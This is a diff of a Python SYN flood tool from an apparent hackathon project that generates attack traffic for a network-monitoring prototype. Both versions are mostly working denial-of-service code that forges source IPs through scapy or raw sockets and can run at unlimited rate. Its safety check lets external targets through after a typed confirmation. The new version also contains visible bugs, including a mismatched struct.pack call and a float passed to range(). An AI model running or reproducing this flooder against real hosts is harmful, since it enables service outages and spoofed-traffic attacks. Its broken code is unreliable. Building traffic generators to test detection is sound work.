@@ -1,15 +1,4 @@
-#!/usr/bin/env python3
-"""
-EKADHARA Attack Script — SYN Flood
-PS-26145 | SIH 2026 Hackathon Prototype
-
-Sends raw TCP SYN packets with random spoofed source IPs to the target.
-Generates real network traffic detectable by the EKADHARA monitoring pipeline.
-
-Usage:
-    python syn_flood.py --target <ip> --port <port> [--count <num>] [--rate <pps>] [--verbose]
-"""
-
+"""SYN Flood attack — sends spoofed TCP SYN packets."""
 import argparse
 import ipaddress
 import os
@@ -19,400 +8,230 @@ import struct
 import sys
 import threading
 import time
-from datetime import datetime
+from typing import Optional
 
-# ============================================================
-# ANSI Color Codes (Windows Terminal compatible)
-# ============================================================
-RED = "\033[91m"
-GREEN = "\033[92m"
-YELLOW = "\033[93m"
-BLUE = "\033[94m"
-MAGENTA = "\033[95m"
-CYAN = "\033[96m"
-WHITE = "\033[97m"
-BOLD = "\033[1m"
-DIM = "\033[2m"
-RESET = "\033[0m"
-
-# ============================================================
-# Scapy import (optional)
-# ============================================================
 try:
-    from scapy.all import IP, TCP, send, RandShort
-    HAS_SCAPY = True
+    from scapy.all import IP, TCP, RandShort, send, conf
+    from scapy.layers.inet import TCP
+    SCAPY_AVAILABLE = True
+    conf.verb = 0
 except ImportError:
-    HAS_SCAPY = False
+    SCAPY_AVAILABLE = False
 
-# ============================================================
-# Constants
-# ============================================================
-BANNER = f"""{BOLD}{MAGENTA}
-╔══════════════════════════════════════════════════╗
-║   EKADHARA Attack Traffic Generator             ║
-║   SYN Flood — PS-26145 | SIH 2026               ║
-╚══════════════════════════════════════════════════╝{RESET}"""
+# ── ANSI Colors (Windows Terminal compatible) ──────────────────────────────
+class Color:
+    RED = "\033[91m"
+    GREEN = "\033[92m"
+    YELLOW = "\033[93m"
+    BLUE = "\033[94m"
+    CYAN = "\033[96m"
+    RESET = "\033[0m"
+    BOLD = "\033[1m"
 
-LEGAL_WARNING = (
-    f"\n{RED}{BOLD}[!] LEGAL WARNING:{RESET}\n"
-    f"    This tool generates REAL network packets.\n"
-    f"    Only use against localhost (127.0.0.1) or IPs you OWN.\n"
-    f"    Unauthorized scanning/flooding is ILLEGAL.\n"
-)
+def banner():
+    print(f"""{Color.BOLD}{Color.CYAN}
+╔══════════════════════════════════════════╗
+║  [EKADHARA] SYN Flood — PS-26145        ║
+╚══════════════════════════════════════════╝{Color.RESET}""")
 
-# ============================================================
-# Safety Checks
-# ============================================================
-def is_safe_target(ip_str):
-    """Check if target is localhost or a private IP address."""
+def is_private(target: str) -> bool:
+    """Check if target is a private/local IP."""
     try:
-        ip = ipaddress.ip_address(ip_str)
-        if ip.is_loopback:
-            return True
-        if ip.is_private:
-            return True
-        return False
+        addr = ipaddress.ip_address(target)
+        return addr.is_private or addr.is_loopback
     except ValueError:
-        return False
+        # Could be a hostname — resolve it
+        try:
+            addr = socket.gethostbyname(target)
+            return ipaddress.ip_address(addr).is_private or ipaddress.ip_address(addr).is_loopback
+        except socket.gaierror:
+            return False
 
-
-def warn_external_target(ip_str):
-    """Print warning if targeting an external IP."""
-    if not is_safe_target(ip_str):
-        print(f"\n{RED}{BOLD}[!!!] EXTERNAL TARGET DETECTED: {ip_str}{RESET}")
-        print(f"    {YELLOW}This script is intended for localhost or private networks only.{RESET}")
-        print(f"    {YELLOW}Ensure you have EXPLICIT WRITTEN PERMISSION from the target owner.{RESET}")
-        confirm = input(f"\n    {BOLD}Type 'I HAVE PERMISSION' to proceed: {RESET}")
-        if confirm.strip() != "I HAVE PERMISSION":
-            print(f"{RED}Aborted.{RESET}")
+def safety_check(target: str):
+    """Warn if target is not localhost or a private IP."""
+    if not is_private(target):
+        print(f"{Color.YELLOW}[!] WARNING: Target {target} is NOT a private/local IP!{Color.RESET}")
+        print(f"{Color.YELLOW}[!] Only attack systems you own or have explicit permission to test.{Color.RESET}")
+        confirm = input(f"{Color.YELLOW}[?] Type 'YES' to continue: {Color.RESET}")
+        if confirm != "YES":
+            print(f"{Color.RED}[!] Aborted.{Color.RESET}")
             sys.exit(0)
-        print(f"{YELLOW}Proceeding with external target...{RESET}\n")
+        print(f"{Color.GREEN}[*] Proceeding with external target...{Color.RESET}")
 
+def raw_syn_packet(target_ip: str, target_port: int, src_ip: str) -> bytes:
+    """Craft a raw TCP SYN packet for fallback mode."""
+    # IP header
+    ip_ihl = 5
+    ip_ver = 4
+    ip_tos = 0
+    ip_tot_len = 0  # kernel will fill
+    ip_id = random.randint(0, 65535)
+    ip_frag_off = 0
+    ip_ttl = 255
+    ip_proto = socket.IPPROTO_TCP
+    ip_check = 0
+    ip_saddr = socket.inet_aton(src_ip)
+    ip_daddr = socket.inet_aton(target_ip)
+    ip_header = struct.pack('!BBHHHBBH4s4s',
+        (ip_ver << 4) + ip_ihl, ip_tos, ip_tot_len,
+        ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
 
-# ============================================================
-# Packet Generation (Scapy)
-# ============================================================
-def generate_random_ip():
-    """Generate a random source IP address."""
-    # Avoid reserved ranges and multicast
-    first_octet = random.choice(
-        list(range(1, 224)) + list(range(224, 239))
-    )
-    # Skip loopback, multicast, reserved
-    if first_octet == 127:
-        first_octet = random.randint(1, 126)
-    if first_octet >= 224:
-        first_octet = random.randint(1, 223)
+    # TCP header
+    tcp_src = random.randint(1024, 65535)
+    tcp_dst = target_port
+    tcp_seq = random.randint(0, 0xFFFFFFFF)
+    tcp_ack = 0
+    tcp_doff = 5
+    tcp_flags = 2  # SYN
+    tcp_window = socket.htons(5840)
+    tcp_check = 0
+    tcp_urg_ptr = 0
+    tcp_header = struct.pack('!HHLLBBHHH',
+        tcp_src, tcp_dst, tcp_seq, tcp_ack,
+        tcp_doff << 4, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)
 
-    return f"{first_octet}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
+    # Pseudo-header for checksum
+    src_bin = socket.inet_aton(src_ip)
+    dst_bin = socket.inet_aton(target_ip)
+    placeholder = 0
+    proto = socket.IPPROTO_TCP
+    tcp_len = len(tcp_header)
+    psh = struct.pack('!4s4sBBH', src_bin, dst_bin, placeholder, proto, tcp_len)
+    pkt = ip_header + tcp_header
+    tcp_check = _checksum(psh + pkt)
+    tcp_header = struct.pack('!HHLLBBH',
+        tcp_src, tcp_dst, tcp_seq, tcp_ack,
+        tcp_doff << 4, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)
 
+    return ip_header + tcp_header
 
-def syn_flood_scapy(target_ip, target_port, count, rate, verbose, stop_event, stats):
-    """SYN flood using scapy."""
-    if verbose:
-        print(f"{CYAN}[SCAPY] Using scapy for packet crafting{RESET}")
+def _checksum(data: bytes) -> int:
+    """Compute Internet checksum."""
+    if len(data) % 2:
+        data += b'\x00'
+    s = sum(struct.unpack(f'!{len(data)//2}H', data))
+    s = (s >> 16) + (s & 0xFFFF)
+    s += s >> 16
+    return (~s) & 0xFFFF
 
-    packets_sent = 0
-    start_time = time.time()
+def run_scapy_attack(target_ip: str, target_port: int, count: int, rate: float, stop_event: threading.Event, stats: dict):
+    """Run SYN flood using scapy."""
+    src_ips = [f"10.0.{random.randint(0,255)}.{random.randint(1,254)}" for _ in range(50)]
+    src_ips += [f"172.16.{random.randint(0,255)}.{random.randint(1,254)}" for _ in range(30)]
+    src_ips += [f"192.168.{random.randint(0,255)}.{random.randint(1,254)}" for _ in range(20)]
 
-    while not stop_event.is_set():
-        if count > 0 and packets_sent >= count:
-            break
+    sent = 0
+    start = time.time()
+    print(f"{Color.GREEN}[+] Scapy mode active — using spoofed IPs{Color.RESET}")
 
-        src_ip = generate_random_ip()
-        src_port = random.randint(1024, 65535)
-
-        # Craft SYN packet with random sequence number
-        pkt = IP(src=src_ip, dst=target_ip) / TCP(
-            sport=src_port,
-            dport=target_port,
-            flags="S",
-            seq=random.randint(0, 2**32 - 1),
-            options=[
-                ('MSS', 1460),
-                ('SAckOK', b''),
-                ('Timestamp', (random.randint(0, 1000000), 0)),
-                ('NOP', None),
-                ('WScale', 7),
-            ]
-        )
+    while not stop_event.is_set() and (count == 0 or sent < count):
+        batch_size = min(rate if rate > 0 else 100, 500)
+        packets = []
+        for _ in range(batch_size):
+            src_ip = random.choice(src_ips)
+            pkt = IP(src=src_ip, dst=target_ip) / TCP(dport=target_port, sport=RandShort(), flags="S")
+            packets.append(pkt)
 
         try:
-            send(pkt, verbose=False)
-            packets_sent += 1
-            stats['packets'] = packets_sent
-
-            elapsed = time.time() - start_time
-            if elapsed > 0:
-                stats['rate'] = packets_sent / elapsed
-            stats['duration'] = elapsed
-
-            if verbose and packets_sent % 50 == 0:
-                print(f"  {DIM}Sent {packets_sent} packets ({stats['rate']:.1f} pps){RESET}")
-
-            # Rate limiting
-            if rate > 0:
-                time.sleep(1.0 / rate)
-
+            send(packets, verbose=False)
+            sent += len(packets)
         except Exception as e:
-            if verbose:
-                print(f"  {RED}Error sending packet: {e}{RESET}")
+            print(f"{Color.RED}[-] Send error: {e}{Color.RESET}")
 
+        stats["sent"] = sent
+        elapsed = time.time() - start
+        if elapsed > 0:
+            stats["rate"] = sent / elapsed
+        time.sleep(0.5 if rate == 0 else max(0.01, 1.0 / rate))
 
-# ============================================================
-# Packet Generation (Raw Sockets fallback)
-# ============================================================
-def checksum(data):
-    """Compute ICMP-like checksum for TCP header."""
-    s = 0
-    for i in range(0, len(data) - 1, 2):
-        s += (data[i] << 8) + data[i + 1]
-    if len(data) % 2:
-        s += data[-1] << 8
-    while s >> 16:
-        s = (s & 0xFFFF) + (s >> 16)
-    return ~s & 0xFFFF
-
-
-def syn_flood_raw(target_ip, target_port, count, rate, verbose, stop_event, stats):
-    """SYN flood using raw sockets (no scapy needed)."""
-    if verbose:
-        print(f"{CYAN}[RAW SOCKET] Using raw sockets for packet crafting{RESET}")
-
+def run_raw_attack(target_ip: str, target_port: int, count: int, rate: float, stop_event: threading.Event, stats: dict):
+    """Run SYN flood using raw sockets."""
     try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
     except PermissionError:
-        print(f"{RED}[ERROR] Raw sockets require Administrator/Root privileges.{RESET}")
-        print(f"{YELLOW}    Run with: sudo python syn_flood.py ...{RESET}")
+        print(f"{Color.YELLOW}[!] Raw sockets require Administrator/root privileges.{Color.RESET}")
+        print(f"{Color.YELLOW}[!] Run this script as Administrator.{Color.RESET}")
         return
 
-    packets_sent = 0
-    start_time = time.time()
+    sent = 0
+    start = time.time()
+    print(f"{Color.GREEN}[+] Raw socket mode active{Color.RESET}")
 
-    while not stop_event.is_set():
-        if count > 0 and packets_sent >= count:
-            break
-
-        src_ip = generate_random_ip()
-        src_port = random.randint(1024, 65535)
-        seq_num = random.randint(0, 2**32 - 1)
-
-        # ---- IP Header ----
-        ip_ihl = 5
-        ip_ver = 4
-        ip_tos = 0
-        ip_tot_len = 40  # 20 (IP) + 20 (TCP)
-        ip_id = random.randint(1, 65535)
-        ip_frag_off = 0
-        ip_ttl = 64
-        ip_proto = socket.IPPROTO_TCP
-        ip_check = 0
-        ip_saddr = socket.inet_aton(src_ip)
-        ip_daddr = socket.inet_aton(target_ip)
-
-        ip_header = struct.pack(
-            "!BBHHHBBH4s4s",
-            (ip_ver << 4) + ip_ihl, ip_tos, ip_tot_len,
-            ip_id, ip_frag_off, ip_ttl, ip_proto,
-            ip_check, ip_saddr, ip_daddr
-        )
-
-        # ---- TCP Header ----
-        tcp_source = src_port
-        tcp_dest = target_port
-        tcp_seq = seq_num
-        tcp_ack_seq = 0
-        tcp_doff = 5  # 5 * 4 = 20 bytes
-        tcp_flags = 0x02  # SYN flag
-        tcp_window = 65535
-        tcp_check = 0
-        tcp_urg_ptr = 0
-
-        tcp_header = struct.pack(
-            "!HHLLBBHHH",
-            tcp_source, tcp_dest, tcp_seq, tcp_ack_seq,
-            (tcp_doff << 4), tcp_flags, tcp_window,
-            tcp_check, tcp_urg_ptr
-        )
-
-        # ---- Pseudo-header for checksum ----
-        pseudo_header = ip_saddr + ip_daddr + struct.pack("!BBH", 0, ip_proto, len(tcp_header))
-        tcp_check = checksum(pseudo_header + tcp_header)
-
-        # Rebuild TCP header with correct checksum
-        tcp_header = struct.pack(
-            "!HHLLBBHHH",
-            tcp_source, tcp_dest, tcp_seq, tcp_ack_seq,
-            (tcp_doff << 4), tcp_flags, tcp_window,
-            tcp_check, tcp_urg_ptr
-        )
-
-        packet = ip_header + tcp_header
-
-        try:
-            sock.sendto(packet, (target_ip, 0))
-            packets_sent += 1
-            stats['packets'] = packets_sent
-
-            elapsed = time.time() - start_time
-            if elapsed > 0:
-                stats['rate'] = packets_sent / elapsed
-            stats['duration'] = elapsed
-
-            if verbose and packets_sent % 50 == 0:
-                print(f"  {DIM}Sent {packets_sent} packets ({stats['rate']:.1f} pps){RESET}")
-
-            if rate > 0:
-                time.sleep(1.0 / rate)
-
-        except Exception as e:
-            if verbose:
-                print(f"  {RED}Error: {e}{RESET}")
+    while not stop_event.is_set() and (count == 0 or sent < count):
+        for _ in range(min(rate if rate > 0 else 100, 100)):
+            src_ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
+            pkt = raw_syn_packet(target_ip, target_port, src_ip)
+            try:
+                sock.sendto(pkt, (target_ip, target_port))
+                sent += 1
+            except Exception:
+                pass
+        stats["sent"] = sent
+        elapsed = time.time() - start
+        if elapsed > 0:
+            stats["rate"] = sent / elapsed
+        time.sleep(0.5 if rate == 0 else max(0.01, 1.0 / rate))
 
     sock.close()
 
-
-# ============================================================
-# Stats Display
-# ============================================================
-def display_stats(stop_event, start_time, target_ip, target_port, verbose):
-    """Periodic stats display thread."""
-    while not stop_event.is_set():
-        time.sleep(1.0)
-        elapsed = time.time() - start_time
-        pkt = stats['packets']
-        rate = stats['rate']
-        duration = stats['duration']
-        pkt_str = f"{BOLD}{WHITE}{pkt}{RESET}"
-        rate_str = f"{BOLD}{CYAN}{rate:.1f}{RESET}"
-        dur_str = f"{BOLD}{YELLOW}{duration:.1f}s{RESET}"
-        tgt_str = f"{BOLD}{GREEN}{target_ip}:{target_port}{RESET}"
-
-        # Use \r for in-place update
-        print(
-            f"\r{BOLD}[SYN FLOOD]{RESET} Target: {tgt_str} | "
-            f"Packets: {pkt_str} | Rate: {rate_str} pps | "
-            f"Duration: {dur_str}  ",
-            end="",
-            flush=True
-        )
-
-
-# ============================================================
-# Main Entry Point
-# ============================================================
-def run_attack(**kwargs):
-    """
-    Main entry point for the SYN flood attack.
-
-    Accepts kwargs dict with keys:
-        target (str): Target IP address
-        port (int): Target port
-        count (int): Number of packets (0 = unlimited)
-        rate (int): Packets per second (0 = unlimited)
-        verbose (bool): Enable verbose output
-    """
-    target = kwargs.get('target', '127.0.0.1')
-    port = kwargs.get('port', 80)
-    count = kwargs.get('count', 0)
-    rate = kwargs.get('rate', 0)
-    verbose = kwargs.get('verbose', False)
-
-    print(BANNER)
-    print(LEGAL_WARNING)
-
-    warn_external_target(target)
-
-    # Shared stats
-    global stats
-    stats = {'packets': 0, 'rate': 0.0, 'duration': 0.0}
-
+def attack_thread(target_ip: str, target_port: int, count: int, rate: float, stats: dict):
+    """Thread target that dispatches to the appropriate backend."""
     stop_event = threading.Event()
-    start_time = time.time()
+    stats["stop_event"] = stop_event
 
-    method = f"{GREEN}scapy{RESET}" if HAS_SCAPY else f"{YELLOW}raw sockets{RESET}"
-    print(f"\n{BOLD}[*] Target:{RESET}    {target}:{port}")
-    print(f"{BOLD}[*] Method:{RESET}    {method}")
-    print(f"{BOLD}[*] Count:{RESET}     {'Unlimited' if count == 0 else count}")
-    print(f"{BOLD}[*] Rate:{RESET}      {'Unlimited' if rate == 0 else f'{rate} pps'}")
-    print(f"{BOLD}[*] Start:{RESET}     {datetime.now().strftime('%H:%M:%S')}")
-    print(f"\n{BOLD}{RED}Press Ctrl+C to stop.{RESET}\n")
-
-    # Start stats display thread
-    stats_thread = threading.Thread(
-        target=display_stats,
-        args=(stop_event, start_time, target, port, verbose),
-        daemon=True
-    )
-    stats_thread.start()
-
-    # Start attack thread
-    if HAS_SCAPY:
-        attack_thread = threading.Thread(
-            target=syn_flood_scapy,
-            args=(target, port, count, rate, verbose, stop_event, stats),
-            daemon=True
-        )
+    if SCAPY_AVAILABLE:
+        run_scapy_attack(target_ip, target_port, count, rate, stop_event, stats)
     else:
-        attack_thread = threading.Thread(
-            target=syn_flood_raw,
-            args=(target, port, count, rate, verbose, stop_event, stats),
-            daemon=True
-        )
+        run_raw_attack(target_ip, target_port, count, rate, stop_event, stats)
 
-    attack_thread.start()
+def run_attack(target: str, port: int = 80, count: int = 0, rate: float = 100, **kwargs):
+    """
+    Launch the SYN flood attack.
+
+    Args:
+        target:  Target IP or hostname
+        port:    Target port (default 80)
+        count:   Number of packets (0 = unlimited)
+        rate:    Packets per second (default 100, 0 = max speed)
+    """
+    banner()
+    print(f"{Color.BLUE}[*] Target: {target}:{port}{Color.RESET}")
+    print(f"{Color.BLUE}[*] Packets: {'Unlimited' if count == 0 else count}{Color.RESET}")
+    print(f"{Color.BLUE}[*] Rate: {rate if rate > 0 else 'Maximum'} pps{Color.RESET}")
+    print(f"{Color.BLUE}[*] Backend: {'Scapy' if SCAPY_AVAILABLE else 'Raw Socket (fallback)'}{Color.RESET}")
+
+    safety_check(target)
+    stats = {"sent": 0, "rate": 0.0}
+    t = threading.Thread(target=attack_thread, args=(target, port, count, rate, stats), daemon=True)
+    t.start()
+    return t, stats
+
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description="SYN Flood Attack Simulator — EKADHARA PS-26145")
+    parser.add_argument("--target", required=True, help="Target IP or hostname")
+    parser.add_argument("--port", type=int, default=80, help="Target port (default: 80)")
+    parser.add_argument("--count", type=int, default=0, help="Number of packets (0=unlimited)")
+    parser.add_argument("--rate", type=float, default=100, help="Packets per second (0=max)")
+    args = parser.parse_args()
+
+    banner()
+    t, stats = run_attack(args.target, args.port, args.count, args.rate)
+
+    print(f"\n{Color.GREEN}[+] Attack running — Press Ctrl+C to stop{Color.RESET}")
+    print(f"{Color.CYAN}{'─'*50}{Color.RESET}")
+    print(f"  {'Sent':>10}  {'Rate':>10}  {'Status':>20}")
+    print(f"{Color.CYAN}{'─'*50}{Color.RESET}")
 
     try:
-        while attack_thread.is_alive():
-            attack_thread.join(timeout=1)
+        while t.is_alive():
+            print(f"\r  {Color.GREEN}{stats['sent']:>10,}{Color.RESET}  "
+                  f"{Color.YELLOW}{stats['rate']:>9.1f}/s{Color.RESET}  "
+                  f"{'Flooding':>20}", end="", flush=True)
+            time.sleep(0.5)
     except KeyboardInterrupt:
-        print(f"\n\n{BOLD}{YELLOW}[*] Stopping SYN flood...{RESET}")
-        stop_event.set()
-        attack_thread.join(timeout=2)
-
-    # Final summary
-    elapsed = time.time() - start_time
-    print(f"\n\n{BOLD}{GREEN}{'='*50}{RESET}")
-    print(f"{BOLD}{GREEN}  SYN FLOOD SUMMARY{RESET}")
-    print(f"{BOLD}{GREEN}{'='*50}{RESET}")
-    print(f"  Target:          {target}:{port}")
-    print(f"  Packets sent:    {stats['packets']}")
-    print(f"  Avg rate:        {stats['packets']/elapsed:.1f} pps" if elapsed > 0 else "  Avg rate:        N/A")
-    print(f"  Duration:        {elapsed:.1f}s")
-    print(f"  Method:          {'scapy' if HAS_SCAPY else 'raw sockets'}")
-    print(f"{BOLD}{GREEN}{'='*50}{RESET}")
-
-
-# ============================================================
-# CLI
-# ============================================================
-def main():
-    parser = argparse.ArgumentParser(
-        description="EKADHARA SYN Flood Attack Generator — PS-26145",
-        formatter_class=argparse.RawDescriptionHelpFormatter,
-        epilog="""
-Examples:
-  python syn_flood.py --target 127.0.0.1 --port 8080
-  python syn_flood.py --target 127.0.0.1 --port 8080 --count 1000 --rate 500
-  python syn_flood.py --target 127.0.0.1 --port 8080 --verbose
-        """
-    )
-    parser.add_argument('--target', required=True, help='Target IP address')
-    parser.add_argument('--port', type=int, required=True, help='Target port')
-    parser.add_argument('--count', type=int, default=0, help='Number of packets (0=unlimited)')
-    parser.add_argument('--rate', type=int, default=0, help='Packets per second (0=unlimited)')
-    parser.add_argument('--verbose', action='store_true', help='Enable verbose output')
-
-    args = parser.parse_args()
-    run_attack(
-        target=args.target,
-        port=args.port,
-        count=args.count,
-        rate=args.rate,
-        verbose=args.verbose
-    )
-
-
-if __name__ == '__main__':
-    main()
+        print(f"\n\n{Color.YELLOW}[!] Stopping...{Color.RESET}")
+        if "stop_event" in stats:
+            stats["stop_event"].set()
+        t.join(timeout=3)
+        print(f"{Color.GREEN}[+] Sent {stats['sent']:,} SYN packets total.{Color.RESET}")
